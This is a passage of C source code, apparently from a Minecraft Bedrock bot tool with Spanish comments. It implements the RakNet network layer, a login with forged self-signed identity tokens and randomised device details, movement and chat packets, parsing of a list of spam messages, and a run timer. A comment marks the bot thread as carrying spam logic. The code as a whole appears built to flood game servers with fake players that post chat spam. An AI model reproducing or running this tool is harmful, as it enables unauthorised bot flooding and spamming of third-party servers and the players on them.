            if (y < 8 && x < 8) { buf[i]=53; buf[i+1]=26; buf[i+2]=14; buf[i+3]=255; }
            else if (y >= 8 && y < 16 && x >= 8 && x < 16) { buf[i]=141; buf[i+1]=85; buf[i+2]=49; buf[i+3]=255; }
            else if (y >= 20 && y < 32 && x >= 20 && x < 28) { buf[i]=53; buf[i+1]=97; buf[i+2]=145; buf[i+3]=255; }
            else if (y >= 20 && y < 32 && x >= 44 && x < 48) { buf[i]=53; buf[i+1]=97; buf[i+2]=145; buf[i+3]=255; }
            else if (y >= 20 && y < 32 && x >= 4 && x < 8) { buf[i]=44; buf[i+1]=44; buf[i+2]=88; buf[i+3]=255; }
            else if (y >= 52 && y < 64 && x >= 20 && x < 24) { buf[i]=44; buf[i+1]=44; buf[i+2]=88; buf[i+3]=255; }
            else if (y >= 52 && y < 64 && x >= 36 && x < 40) { buf[i]=53; buf[i+1]=97; buf[i+2]=145; buf[i+3]=255; }
            else { buf[i]=0; buf[i+1]=0; buf[i+2]=0; buf[i+3]=0; }
        }
    }
    return base64_encode_mc(buf, sizeof(buf));
}

static char *g_steve_skin_b64_mc = NULL;

// ─── Parsing de mensajes (idéntico a mcbot.c) ──────────────────────────────
static void parse_mensajes_mc(const char *raw) {
    MENSAJES_COUNT = 0;
    if (!raw || strlen(raw) == 0) return;
    char tmp[1024];
    strncpy(tmp, raw, sizeof(tmp)-1);
    tmp[sizeof(tmp)-1] = '\0';
    char *sv, *tok = strtok_r(tmp, "|", &sv);
    while (tok && MENSAJES_COUNT < MAX_MENSAJES) {
        while (*tok == ' ') tok++;
        char *end = tok + strlen(tok) - 1;
        while (end > tok && *end == ' ') { *end = '\0'; end--; }
        for (char *p = tok; *p; p++) if (*p == '-') *p = ' ';
        if (strlen(tok) > 0) {
            strncpy(MENSAJES[MENSAJES_COUNT], tok, MAX_MSG_LEN-1);
            MENSAJES[MENSAJES_COUNT][MAX_MSG_LEN-1] = '\0';
            MENSAJES_COUNT++;
        }
        tok = strtok_r(NULL, "|", &sv);
    }
}

// ─── Sent Frames, ACK, NACK (igual que mcbot.c) ────────────────────────────
static void sf_put_mc(MCBot *bot, uint32_t seq, const uint8_t *data, size_t len) {
    int idx = bot->sent_frames_count % FRAME_STORE_MAX;
    if (bot->sent_frames[idx].data) free(bot->sent_frames[idx].data);
    bot->sent_frames[idx].seq = seq;
    bot->sent_frames[idx].data = (uint8_t *)malloc(len);
    bot->sent_frames[idx].len = len;
    memcpy(bot->sent_frames[idx].data, data, len);
    bot->sent_frames_count++;
}

static SentFrameMC *sf_get_mc(MCBot *bot, uint32_t seq) {
    int total = bot->sent_frames_count < FRAME_STORE_MAX ? bot->sent_frames_count : FRAME_STORE_MAX;
    for (int i = 0; i < total; i++) {
        if (bot->sent_frames[i].data && bot->sent_frames[i].seq == seq)
            return &bot->sent_frames[i];
    }
    return NULL;
}

static void send_ack_mc(MCBot *bot, const uint32_t *nums, int count) {
    if (bot->sockfd < 0 || bot->is_closing || count == 0) return;
    uint32_t sorted[4096]; int slen = 0;
    for (int i = 0; i < count && slen < 4096; i++) sorted[slen++] = nums[i];
    for (int i = 0; i < slen - 1; i++)
        for (int j = i+1; j < slen; j++)
            if (sorted[j] < sorted[i]) { uint32_t t=sorted[i]; sorted[i]=sorted[j]; sorted[j]=t; }
    uint32_t ranges[4096][2]; int rcnt = 0;
    for (int i = 0; i < slen;) {
        uint32_t s = sorted[i], e = s;
        while (i + 1 < slen && sorted[i+1] == sorted[i] + 1) { i++; e = sorted[i]; }
        ranges[rcnt][0] = s; ranges[rcnt][1] = e; rcnt++; i++;
    }
    BufMC b; buf_init_mc(&b);
    w_u8_mc(&b, RAK_ACK_MC);
    w_u16be_mc(&b, (uint16_t)rcnt);
    for (int i = 0; i < rcnt; i++) {
        if (ranges[i][0] == ranges[i][1]) {
            w_u8_mc(&b, 1); w_tLE_mc(&b, ranges[i][0]);
        } else {
            w_u8_mc(&b, 0); w_tLE_mc(&b, ranges[i][0]); w_tLE_mc(&b, ranges[i][1]);
        }
    }
    sendto(bot->sockfd, b.data, b.len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
    buf_free_mc(&b);
}

static void handle_nack_mc(MCBot *bot, const uint8_t *msg, size_t len) {
    if (bot->sockfd < 0 || bot->is_closing || len < 3) return;
    size_t pos = 1;
    int cnt = (msg[pos] << 8) | msg[pos+1]; pos += 2;
    for (int i = 0; i < cnt && pos + 1 < len; i++) {
        int single = msg[pos++];
        uint32_t s = (msg[pos] | (msg[pos+1] << 8) | (msg[pos+2] << 16)); pos += 3;
        uint32_t e = single ? s : (msg[pos] | (msg[pos+1] << 8) | (msg[pos+2] << 16)); pos += 3;
        for (uint32_t seq = s; seq <= e; seq++) {
            SentFrameMC *f = sf_get_mc(bot, seq);
            if (f) sendto(bot->sockfd, f->data, f->len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
        }
    }
}

// ─── Frame Send (igual que mcbot.c) ──────────────────────────────────────
static void _send_frame_mc(MCBot *bot, const uint8_t *payload, size_t plen, int is_split, uint32_t split_count, uint16_t split_id_v, uint32_t split_idx) {
    if (bot->sockfd < 0 || bot->is_closing) return;
    uint32_t seq = bot->send_seq++;
    BufMC b; buf_init_mc(&b);
    w_u8_mc(&b, 0x84);
    w_tLE_mc(&b, seq);
    w_u8_mc(&b, is_split ? 0x70 : 0x60);
    w_u16be_mc(&b, (uint16_t)(plen * 8));
    w_tLE_mc(&b, bot->msg_index++);
    w_tLE_mc(&b, bot->order_index++);
    w_u8_mc(&b, 0);
    if (is_split) {
        w_u32be_mc(&b, split_count);
        w_u16be_mc(&b, split_id_v);
        w_u32be_mc(&b, split_idx);
    }
    w_raw_mc(&b, payload, plen);
    sf_put_mc(bot, seq, b.data, b.len);
    sendto(bot->sockfd, b.data, b.len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
    buf_free_mc(&b);
}

static void send_reliable_mc(MCBot *bot, const uint8_t *payload, size_t len) {
    if (bot->sockfd < 0 || bot->is_closing) return;
    int MAX = (bot->mtu_size > 0 ? bot->mtu_size : 1200) - 60;
    if ((int)len <= MAX) {
        _send_frame_mc(bot, payload, len, 0, 0, 0, 0);
        return;
    }
    uint16_t sid = (bot->split_id_counter++) & 0xFFFF;
    uint32_t cnt = (uint32_t)((len + MAX - 1) / MAX);
    for (uint32_t i = 0; i < cnt; i++) {
        size_t off = (size_t)i * MAX;
        size_t chunk = (len - off < (size_t)MAX) ? (len - off) : (size_t)MAX;
        _send_frame_mc(bot, payload + off, chunk, 1, cnt, sid, i);
    }
}

// ─── Batch (igual que mcbot.c) ─────────────────────────────────────────────
static void build_batch_mc(MCBot *bot, const uint8_t *pkt, size_t pktlen, BufMC *out) {
    uint8_t *inner = (uint8_t *)malloc(4 + pktlen);
    inner[0] = (pktlen >> 24) & 0xFF; inner[1] = (pktlen >> 16) & 0xFF;
    inner[2] = (pktlen >> 8) & 0xFF; inner[3] = pktlen & 0xFF;
    memcpy(inner + 4, pkt, pktlen);
    size_t ilen = 4 + pktlen;
    uLongf comp_len = compressBound(ilen);
    uint8_t *comp = (uint8_t *)malloc(comp_len);
    compress2(comp, &comp_len, inner, ilen, 7);
    free(inner);
    buf_init_mc(out);
    if (bot->proto >= 84) {
        w_u8_mc(out, 0xfe);
        w_u8_mc(out, 0x06);
        w_i32be_mc(out, (int32_t)comp_len);
    } else {
        w_u8_mc(out, P70_BATCH_MC);
        w_i32be_mc(out, (int32_t)comp_len);
    }
    w_raw_mc(out, comp, comp_len);
    free(comp);
}

static void send_game_mc(MCBot *bot, const uint8_t *pkt, size_t pktlen) {
    BufMC batch; build_batch_mc(bot, pkt, pktlen, &batch);
    send_reliable_mc(bot, batch.data, batch.len);
    buf_free_mc(&batch);
}

// ─── Login (igual que mcbot.c) ──────────────────────────────────────────────
static void build_login84_mc(MCBot *bot, BufMC *out) {
    char *pub = pub_key_b64_mc();
    int64_t now = (int64_t)(now_unix_ms() / 1000);
    char payload_json[8192];
    snprintf(payload_json, sizeof(payload_json),
        "{\"extraData\":{\"displayName\":\"%s\",\"identity\":\"%s\",\"XUID\":\"%s\"},"
        "\"identityPublicKey\":\"%s\",\"nbf\":%lld,\"exp\":%lld}",
        bot->nombre, bot->uuid, bot->xuid,
        pub, (long long)(now - 60), (long long)(now + 86400));
    free(pub);
    char *chain_jwt = make_jwt_mc(payload_json);
    const char *skin_b64 = g_steve_skin_b64_mc ? g_steve_skin_b64_mc : "AAAA";
    uint32_t cid_lo = (uint32_t)(bot->client_id & 0xFFFFFFFFULL);
    char skin_json[1 << 17];
    snprintf(skin_json, sizeof(skin_json),
        "{\"ClientRandomId\":%u,\"ServerAddress\":\"%s:%d\","
        "\"SkinData\":\"%s\",\"SkinId\":\"Standard_Custom\","
        "\"CapeData\":\"\",\"SkinGeometryName\":\"geometry.humanoid.custom\","
        "\"SkinGeometry\":\"\",\"DeviceOS\":%d,\"DeviceModel\":\"%s\","
        "\"GameVersion\":\"%s\",\"CurrentInputMode\":%d,\"DefaultInputMode\":%d,"
        "\"UIProfile\":%d,\"GuiScale\":%d,\"LanguageCode\":\"%s\"}",
        cid_lo, bot->host, bot->port, skin_b64,
        rand() % 4 + 1, "SM-G950F", "0.16.0",
        rand() % 2 + 1, rand() % 2 + 1, rand() % 2, rand() % 3, "en_US");
    char *skin_jwt = make_jwt_mc(skin_json);
    BufMC chain_buf; buf_init_mc(&chain_buf);
    char chain_wrapper[1 << 16];
    snprintf(chain_wrapper, sizeof(chain_wrapper), "{\"chain\":[\"%s\"]}", chain_jwt);
    free(chain_jwt);
    w_raw_mc(&chain_buf, (const uint8_t *)chain_wrapper, strlen(chain_wrapper));
    BufMC skin_buf; buf_init_mc(&skin_buf);
    w_raw_mc(&skin_buf, (const uint8_t *)skin_jwt, strlen(skin_jwt));
    free(skin_jwt);
    BufMC raw; buf_init_mc(&raw);
    w_i32le_mc(&raw, (int32_t)chain_buf.len);
    w_raw_mc(&raw, chain_buf.data, chain_buf.len);
    w_i32le_mc(&raw, (int32_t)skin_buf.len);
    w_raw_mc(&raw, skin_buf.data, skin_buf.len);
    buf_free_mc(&chain_buf); buf_free_mc(&skin_buf);
    uLongf comp_len = compressBound(raw.len);
    uint8_t *comp = (uint8_t *)malloc(comp_len);
    compress2(comp, &comp_len, raw.data, raw.len, 7);
    buf_free_mc(&raw);
    buf_init_mc(out);
    w_u8_mc(out, 0xfe); w_u8_mc(out, 0x01);
    w_i32be_mc(out, 84);
    w_i32be_mc(out, (int32_t)comp_len);
    w_raw_mc(out, comp, comp_len);
    free(comp);
}

static void build_rspack_resp_mc(int s, BufMC *out) {
    buf_init_mc(out);
    w_u8_mc(out, P84_RSPACK_RESP_MC); w_u8_mc(out, (uint8_t)s); w_u16be_mc(out, 0);
}

// ─── Game Packets (igual que mcbot.c) ──────────────────────────────────────
static void build_chunk_radius_mc(MCBot *bot, BufMC *out) {
    buf_init_mc(out);
    int radius = rand_range(4, 11);
    if (bot->proto >= 84) {
        w_u8_mc(out, P84_CHUNK_RADIUS_MC);
        w_varint_mc(out, (uint32_t)radius);
    } else {
        w_u8_mc(out, 0xc9);
        w_i32be_mc(out, radius);
    }
}

static void build_move_pkt_mc(MCBot *bot, BufMC *out) {
    buf_init_mc(out);
    if ((double)rand()/RAND_MAX < 0.1) {
        bot->velocity_y = 0.42f;
        bot->on_ground = 0;
    }
    if (!bot->on_ground) {
        bot->velocity_y -= 0.08f;
        bot->pos_y += bot->velocity_y;
        if (bot->pos_y <= 64.0f) {
            bot->pos_y = 64.0f;
            bot->velocity_y = 0.0f;
            bot->on_ground = 1;
        }
    }
    if (bot->proto >= 84) {
        uint8_t id = bot->variant_a ? 0x10 : P84_MOVE_PLAYER_MC;
        w_u8_mc(out, id);
        w_i64be_mc(out, bot->entity_id);
        w_f32be_mc(out, bot->pos_x); w_f32be_mc(out, bot->pos_y); w_f32be_mc(out, bot->pos_z);
        w_f32be_mc(out, bot->pos_yaw); w_f32be_mc(out, bot->pos_headyaw); w_f32be_mc(out, bot->pos_pitch);
        w_u8_mc(out, bot->on_ground ? 1 : 0); w_u8_mc(out, 1);
    } else {
        w_u8_mc(out, 0x9d);
        w_i64be_mc(out, bot->entity_id);
        w_f32be_mc(out, bot->pos_x); w_f32be_mc(out, bot->pos_y + 1.62f); w_f32be_mc(out, bot->pos_z);
        w_f32be_mc(out, bot->pos_yaw); w_f32be_mc(out, bot->pos_headyaw); w_f32be_mc(out, bot->pos_pitch);
        w_u8_mc(out, 0); w_u8_mc(out, bot->on_ground ? 1 : 0);
    }
}

static void build_chat_pkt_mc(MCBot *bot, const char *msg, BufMC *out) {
    buf_init_mc(out);
    if (bot->proto >= 84) {
        uint8_t id = bot->variant_a ? 0x07 : P84_TEXT_MC;
        w_u8_mc(out, id); w_u8_mc(out, 1);
        w_str_mc(out, bot->nombre); w_str_mc(out, msg);
    } else {
        w_u8_mc(out, P70_TEXT_MC); w_u8_mc(out, 1);
        w_str_mc(out, bot->nombre); w_str_mc(out, msg);
    }
}

// ─── Handle Packets (igual que mcbot.c) ────────────────────────────────────
static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
    if (!data || len == 0 || bot->is_closing) return;
    uint8_t pid = data[0];

    /* PLAY_STATUS */
    if (pid == P70_PLAY_STATUS_MC || pid == P84_PLAY_STATUS_MC) {
        if (len >= 5) {
            int32_t st = (int32_t)((data[1] << 24) | (data[2] << 16) | (data[3] << 8) | data[4]);
            const char *names[] = {"LoginOK","ClienteViejo","ServidorLleno","Spawneado","MundoViejo","ClienteNuevo"};
            printf(GRAY "[MCBot] %s PLAY_STATUS=%d (%s)\n" RESET, bot->nombre, st,
                   (st >= 0 && st <= 5) ? names[st] : "?");
            if (st == 0) {
                BufMC cr; build_chunk_radius_mc(bot, &cr);
                send_game_mc(bot, cr.data, cr.len); buf_free_mc(&cr);
            } else if (st == 1 || st == 2 || st == 4) {
                bot->is_closing = 1;
            } else if (st == 3) {
                if (bot->spawned) return;
                bot->spawned = 1;
                bot->spawned_ok = 1;
                bot->phase = PHASE_GAME_MC;
                bot->t_spawn_timeout = 0;
                bot->t_spawn_fallback = 0;
                printf(GREEN "[MCBot] %s ✓ spawneado en %s:%d\n" RESET, bot->nombre, bot->host, bot->port);
                bot->t_register = now_ms() + rand_range(800, 2500);
                bot->t_start_move_chat = now_ms() + rand_range(1000, 3000);
            }
        }
        return;
    }

    /* DISCONNECT */
    if (pid == P70_DISCONNECT_MC || pid == P84_DISCONNECT_MC) {
        printf(YELLOW "[MCBot] %s desconectado (kick)\n" RESET, bot->nombre);
        bot->is_closing = 1;
        return;
    }

    /* RSPACK_INFO — igual que mcbot.c */
    if (pid == P84_RSPACK_INFO_MC && bot->proto >= 84) {
        if (!bot->rpack_resp_sent) {
            printf(GRAY "[MCBot] %s ResourcePackInfo → aceptando\n" RESET, bot->nombre);
            BufMC rp; build_rspack_resp_mc(3, &rp);
            send_game_mc(bot, rp.data, rp.len); buf_free_mc(&rp);
            bot->rpack_resp_sent = 1;
        }
        return;
    }

    /* RSPACK_STACK — igual que mcbot.c */
    if (pid == P84_RSPACK_STACK_MC && bot->proto >= 84) {
        if (!bot->rpack_done) {
            bot->rpack_done = 1;
            bot->rpack_resp_sent = 1;
            printf(GRAY "[MCBot] %s ResourcePackStack → completado\n" RESET, bot->nombre);
            BufMC rp; build_rspack_resp_mc(4, &rp);
            send_game_mc(bot, rp.data, rp.len); buf_free_mc(&rp);
        }
        return;
    }

    /* SERVER_HS — igual que mcbot.c */
    if (pid == P84_SERVER_HS_MC && bot->proto >= 84) {
        printf(GRAY "[MCBot] %s ServerHandshake → respondiendo\n" RESET, bot->nombre);
        BufMC hs; buf_init_mc(&hs); w_u8_mc(&hs, P84_CLIENT_HS_MC);
        send_game_mc(bot, hs.data, hs.len); buf_free_mc(&hs);
        BufMC cr; build_chunk_radius_mc(bot, &cr);
        send_game_mc(bot, cr.data, cr.len); buf_free_mc(&cr);
        return;
    }

    /* START_GAME — variante A (0x09) y variante B (0x0b), igual que mcbot.c */
    if (pid == P70_START_GAME_MC || pid == P84_START_GAME_MC || pid == 0x09) {
        if (bot->proto >= 84) {
            int was_a = bot->variant_a;
            bot->variant_a = (pid == 0x09);
            if (bot->variant_a != was_a)
                printf(GRAY "[MCBot] %s Proto 84 variante %s detectada\n" RESET,
                       bot->nombre, bot->variant_a ? "A" : "B");
        }
        if (len >= 25) {
            size_t pos = 1;
            pos += 4; pos += 1; pos += 4; pos += 4;
            bot->entity_id = (int64_t)((uint64_t)data[pos] << 56 | (uint64_t)data[pos+1] << 48 |
                                       (uint64_t)data[pos+2] << 40 | (uint64_t)data[pos+3] << 32 |
                                       (uint64_t)data[pos+4] << 24 | (uint64_t)data[pos+5] << 16 |
                                       (uint64_t)data[pos+6] << 8 | (uint64_t)data[pos+7]);
            pos += 8; pos += 4; pos += 4;
            memcpy(&bot->pos_x, data + pos, 4); pos += 4;
            memcpy(&bot->pos_y, data + pos, 4); pos += 4;
            memcpy(&bot->pos_z, data + pos, 4); pos += 4;
        }
        printf(GRAY "[MCBot] %s START_GAME eid=%lld pos=(%.1f,%.1f,%.1f)\n" RESET,
               bot->nombre, (long long)bot->entity_id, bot->pos_x, bot->pos_y, bot->pos_z);
        BufMC cr; build_chunk_radius_mc(bot, &cr);
        send_game_mc(bot, cr.data, cr.len); buf_free_mc(&cr);
        if (!bot->t_spawn_fallback)
            bot->t_spawn_fallback = now_ms() + rand_range(5000, 8000);
        return;
    }

    /* RESPAWN — igual que mcbot.c */
    if (pid == P84_RESPAWN_MC && bot->proto >= 84) {
        if (len >= 13) {
            memcpy(&bot->pos_x, data + 1, 4);
            memcpy(&bot->pos_y, data + 5, 4);
            memcpy(&bot->pos_z, data + 9, 4);
        }
        BufMC re; buf_init_mc(&re);
        w_u8_mc(&re, P84_RESPAWN_MC);
        w_f32be_mc(&re, bot->pos_x); w_f32be_mc(&re, bot->pos_y); w_f32be_mc(&re, bot->pos_z);
        send_game_mc(bot, re.data, re.len); buf_free_mc(&re);
        return;
    }
}

static void handle_batch_mc(MCBot *bot, const uint8_t *payload, size_t len) {
    if (bot->is_closing || len < 4) return;
    int32_t comp_len = (payload[0] << 24) | (payload[1] << 16) | (payload[2] << 8) | payload[3];
    if (comp_len <= 0 || (size_t)comp_len > len - 4) return;
    const uint8_t *comp = payload + 4;
    uLongf inner_max = (uLongf)comp_len * 16 + 65536;
    uint8_t *inner = (uint8_t *)malloc(inner_max);
    if (uncompress(inner, &inner_max, comp, comp_len) != Z_OK) { free(inner); return; }
    size_t pos = 0;
    while (pos + 4 <= inner_max) {
        uint32_t plen = (inner[pos] << 24) | (inner[pos+1] << 16) | (inner[pos+2] << 8) | inner[pos+3];
        pos += 4;
        if (plen == 0 || pos + plen > inner_max) break;
        mcbot_handle_game_pkt(bot, inner + pos, plen);
        pos += plen;
    }
    free(inner);
}

static void handle_rak_handshake_mc(MCBot *bot, const uint8_t *payload, size_t len) {
    if (bot->is_closing) return;
    int64_t ping_time = 0;
    if (len >= 94) {
        size_t pos = 1 + 7 + 70;
        if (pos + 8 <= len) {
            ping_time = (int64_t)((uint64_t)payload[pos]   << 56 | (uint64_t)payload[pos+1] << 48 |
                                  (uint64_t)payload[pos+2] << 40 | (uint64_t)payload[pos+3] << 32 |
                                  (uint64_t)payload[pos+4] << 24 | (uint64_t)payload[pos+5] << 16 |
                                  (uint64_t)payload[pos+6] <<  8 | (uint64_t)payload[pos+7]);
        }
    }
    BufMC hw; buf_init_mc(&hw);
    w_u8_mc(&hw, 0x13);
    w_std_ip_mc(&hw, bot->host, bot->port);
    for (int i = 0; i < 10; i++) {
        w_u8_mc(&hw, 4); w_u8_mc(&hw, 0x80); w_u8_mc(&hw, 0xFF); w_u8_mc(&hw, 0xFF); w_u8_mc(&hw, 0xFE);
        w_u16be_mc(&hw, 0);
    }
    w_i64be_mc(&hw, ping_time);
    w_i64be_mc(&hw, now_unix_ms());
    _send_frame_mc(bot, hw.data, hw.len, 0, 0, 0, 0);
    buf_free_mc(&hw);
    if (bot->phase == PHASE_HANDSHAKING_MC) {
        bot->phase = PHASE_LOGIN_MC;
        BufMC login; buf_init_mc(&login);
        build_login84_mc(bot, &login);
        send_reliable_mc(bot, login.data, login.len);
        buf_free_mc(&login);
    }
}

static void handle_inner_mc(MCBot *bot, const uint8_t *payload, size_t len) {
    if (!payload || len == 0 || bot->is_closing) return;
    uint8_t pid = payload[0];
    if (pid == RAK_CONN_PING_MC && len >= 9) {
        int64_t t = (int64_t)((uint64_t)payload[1] << 56 | (uint64_t)payload[2] << 48 |
                              (uint64_t)payload[3] << 40 | (uint64_t)payload[4] << 32 |
                              (uint64_t)payload[5] << 24 | (uint64_t)payload[6] << 16 |
                              (uint64_t)payload[7] << 8 | (uint64_t)payload[8]);
        BufMC b; buf_init_mc(&b);
        w_u8_mc(&b, RAK_CONN_PONG_MC);
        w_i64be_mc(&b, t);
        w_i64be_mc(&b, now_unix_ms());
        _send_frame_mc(bot, b.data, b.len, 0, 0, 0, 0);
        buf_free_mc(&b);
        return;
    }
    if (pid == RAK_CONN_PONG_MC) return;
    if (pid == RAK_DISCONN_MC) { bot->is_closing = 1; return; }
    if (pid == RAK_NEW_INC_CONN_MC) { handle_rak_handshake_mc(bot, payload, len); return; }
    if (pid == 0xfe) {
        if (len < 2) return;
        if (payload[1] == 0x06) handle_batch_mc(bot, payload + 2, len - 2);
        else mcbot_handle_game_pkt(bot, payload + 1, len - 1);
        return;
    }
    if (pid == P70_BATCH_MC) { handle_batch_mc(bot, payload + 1, len - 1); return; }
    mcbot_handle_game_pkt(bot, payload, len);
}

static void parse_data_pkt_mc(MCBot *bot, const uint8_t *msg, size_t len) {
    if (bot->is_closing || len < 4) return;
    size_t pos = 1;
    uint32_t seq = msg[pos] | (msg[pos+1] << 8) | (msg[pos+2] << 16); pos += 3;
    if (bot->ack_queue_len < 4096) bot->ack_queue[bot->ack_queue_len++] = seq;
    while (pos < len) {
        if (pos >= len) break;
        uint8_t flags = msg[pos++];
        if (pos + 1 >= len) break;
        uint16_t bits = (msg[pos] << 8) | msg[pos+1]; pos += 2;
        size_t blen = (bits + 7) / 8;
        int rel = (flags >> 5) & 7;
        int is_split = (flags >> 4) & 1;
        if (rel == 2 || rel == 3 || rel == 4 || rel == 6 || rel == 7) { pos += 3; }
        if (rel == 1 || rel == 3 || rel == 4) { pos += 4; }
        uint32_t sc = 0, sx = 0; uint16_t si_v = 0;
        if (is_split) {
            if (pos + 10 > len) break;
            sc = (msg[pos] << 24) | (msg[pos+1] << 16) | (msg[pos+2] << 8) | msg[pos+3]; pos += 4;
            si_v = (msg[pos] << 8) | msg[pos+1]; pos += 2;
            sx = (msg[pos] << 24) | (msg[pos+1] << 16) | (msg[pos+2] << 8) | msg[pos+3]; pos += 4;
        }
        if (blen == 0 || pos + blen > len) break;
        const uint8_t *payload = msg + pos;
        pos += blen;
        if (is_split) {
            int slot = -1;
            for (int i = 0; i < SPLIT_MAP_MAX; i++) {
                if (bot->split_map[i].used && bot->split_map[i].split_id == si_v) { slot = i; break; }
            }
            if (slot < 0) {
                for (int i = 0; i < SPLIT_MAP_MAX; i++) {
                    if (!bot->split_map[i].used) { slot = i; break; }
                }
                if (slot < 0) slot = 0;
                bot->split_map[slot].used = 1;
                bot->split_map[slot].split_id = si_v;
                bot->split_map[slot].count = sc;
                bot->split_map[slot].filled = 0;
                for (int i = 0; i < SPLIT_PARTS_MAX; i++) bot->split_map[slot].parts[i] = NULL;
            }
            if (sx < SPLIT_PARTS_MAX && !bot->split_map[slot].parts[sx]) {
                bot->split_map[slot].parts[sx] = (uint8_t *)malloc(blen);
                bot->split_map[slot].part_lens[sx] = blen;
                memcpy(bot->split_map[slot].parts[sx], payload, blen);
                bot->split_map[slot].filled++;
                if ((uint32_t)bot->split_map[slot].filled == sc) {
                    size_t total = 0;
                    for (uint32_t i = 0; i < sc && i < SPLIT_PARTS_MAX; i++)
                        if (bot->split_map[slot].parts[i]) total += bot->split_map[slot].part_lens[i];
                    uint8_t *assembled = (uint8_t *)malloc(total);
                    size_t off = 0;
                    for (uint32_t i = 0; i < sc && i < SPLIT_PARTS_MAX; i++) {
                        if (bot->split_map[slot].parts[i]) {
                            memcpy(assembled + off, bot->split_map[slot].parts[i], bot->split_map[slot].part_lens[i]);
                            off += bot->split_map[slot].part_lens[i];
                            free(bot->split_map[slot].parts[i]);
                            bot->split_map[slot].parts[i] = NULL;
                        }
                    }
                    bot->split_map[slot].used = 0;
                    handle_inner_mc(bot, assembled, total);
                    free(assembled);
                }
            }
        } else {
            handle_inner_mc(bot, payload, blen);
        }
    }
}

static void mcbot_handle_socket_message(MCBot *bot, const uint8_t *msg, size_t len) {
    if (bot->is_closing || len == 0) return;
    uint8_t pid = msg[0];

    if (bot->phase == PHASE_CONNECTING_2_MC) {
        if (pid == RAK_OPEN_REPLY_2_MC) {
            bot->t_req2_retry = 0;
            if (len >= 2) {
                uint16_t mtu = (msg[len-2] << 8) | msg[len-1];
                if (mtu >= 400 && mtu <= 1500) bot->mtu_size = mtu;
            }
            bot->phase = PHASE_HANDSHAKING_MC;
            BufMC cr; buf_init_mc(&cr);
            w_u8_mc(&cr, RAK_CONN_REQ_MC);
            w_u64be_mc(&cr, bot->client_id);
            w_i64be_mc(&cr, now_unix_ms());
            w_u8_mc(&cr, 0);
            _send_frame_mc(bot, cr.data, cr.len, 0, 0, 0, 0);
            buf_free_mc(&cr);
        }
        return;
    }

    if (pid >= 0x80 && pid <= 0x8F) {
        parse_data_pkt_mc(bot, msg, len);
        if (bot->ack_queue_len > 0) {
            send_ack_mc(bot, bot->ack_queue, bot->ack_queue_len);
            bot->ack_queue_len = 0;
        }
        return;
    }
    if (pid == RAK_ACK_MC) return;
    if (pid == RAK_NACK_MC) { handle_nack_mc(bot, msg, len); return; }

    if (pid == RAK_OPEN_REPLY_1_MC && bot->phase == PHASE_CONNECTING_1_MC) {
        if (len >= 2) {
            uint16_t m = (msg[len-2] << 8) | msg[len-1];
            if (m >= 400 && m <= 1500) bot->mtu_size = m;
        }
        if (len >= 25) {
            bot->server_guid = (uint64_t)msg[17] << 56 | (uint64_t)msg[18] << 48 |
                              (uint64_t)msg[19] << 40 | (uint64_t)msg[20] << 32 |
                              (uint64_t)msg[21] << 24 | (uint64_t)msg[22] << 16 |
                              (uint64_t)msg[23] << 8 | (uint64_t)msg[24];
        }
        bot->t_mtu_retry = 0;
        bot->phase = PHASE_CONNECTING_2_MC;
        bot->req2_attempt = 0;
        bot->t_req2_retry = now_ms();
        BufMC req2; buf_init_mc(&req2);
        w_u8_mc(&req2, RAK_OPEN_REQ_2_MC);
        w_magic_mc(&req2);
        w_std_ip_mc(&req2, bot->host, bot->port);
        w_u16be_mc(&req2, bot->mtu_size);
        w_u64be_mc(&req2, bot->client_id);
        sendto(bot->sockfd, req2.data, req2.len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
        buf_free_mc(&req2);
        return;
    }

    if (pid == RAK_PONG_UNCONN_MC && bot->phase == PHASE_UNCONNECTED_MC) {
        bot->t_mtu_retry = 0;
        bot->phase = PHASE_CONNECTING_1_MC;
        int mtu = MTU_LIST[bot->mtu_idx % MTU_LIST_SIZE];
        int pad = mtu - 28 - 1 - 16 - 1;
        if (pad < 0) pad = 0;
        BufMC b; buf_init_mc(&b);
        w_u8_mc(&b, RAK_OPEN_REQ_1_MC);
        w_magic_mc(&b);
        w_u8_mc(&b, 7);
        for (int i = 0; i < pad; i++) w_u8_mc(&b, 0);
        size_t send_len = (size_t)(mtu - 28) < b.len ? (size_t)(mtu - 28) : b.len;
        sendto(bot->sockfd, b.data, send_len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
        buf_free_mc(&b);
        bot->t_mtu_retry = now_ms() + 2500;
        return;
    }
}

static void mcbot_send_ping(MCBot *bot) {
    if (bot->sockfd < 0 || bot->is_closing) return;
    BufMC b; buf_init_mc(&b);
    w_u8_mc(&b, RAK_PING_UNCONN_MC);
    w_i64be_mc(&b, now_unix_ms());
    w_magic_mc(&b);
    w_u64be_mc(&b, bot->client_id);
    sendto(bot->sockfd, b.data, b.len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
    buf_free_mc(&b);
}

// ─── Timer thread ──────────────────────────────────────────────────────────
void *timer_thread_func(void *arg) {
    int tiempo = *(int *)arg;
    free(arg);
    sleep(tiempo);
    g_tiempo_terminado = 1;
    printf(YELLOW "[+] Tiempo de ejecución terminado (%ds)\n" RESET, tiempo);
    return NULL;
}

// ─── Bot Thread (con lógica de spam IDÉNTICA a mcbot.c) ──────────────────
static void *mcbot_thread(void *arg) {
    MCBot *bot = (MCBot *)arg;

    bot->t_keepalive = now_ms() + 5000;
    bot->t_spawn_timeout = now_ms() + 90000;

    while (!bot->is_closing && bot->running && !g_mcbot_stop_requested && !g_tiempo_terminado) {
        int64_t now = now_ms();

        // Receive
        fd_set fds; FD_ZERO(&fds);
        if (bot->sockfd >= 0) FD_SET(bot->sockfd, &fds);
        struct timeval tv = {0, 10000};
        int sel = bot->sockfd >= 0 ? select(bot->sockfd + 1, &fds, NULL, NULL, &tv) : 0;
        if (sel > 0 && FD_ISSET(bot->sockfd, &fds)) {
            uint8_t rbuf[65536];
            socklen_t slen = sizeof(bot->server_addr);
            ssize_t rlen = recvfrom(bot->sockfd, rbuf, sizeof(rbuf), 0, (struct sockaddr *)&bot->server_addr, &slen);
            if (rlen > 0) mcbot_handle_socket_message(bot, rbuf, (size_t)rlen);
        }

        now = now_ms();

        if (g_tiempo_terminado || g_mcbot_stop_requested) {
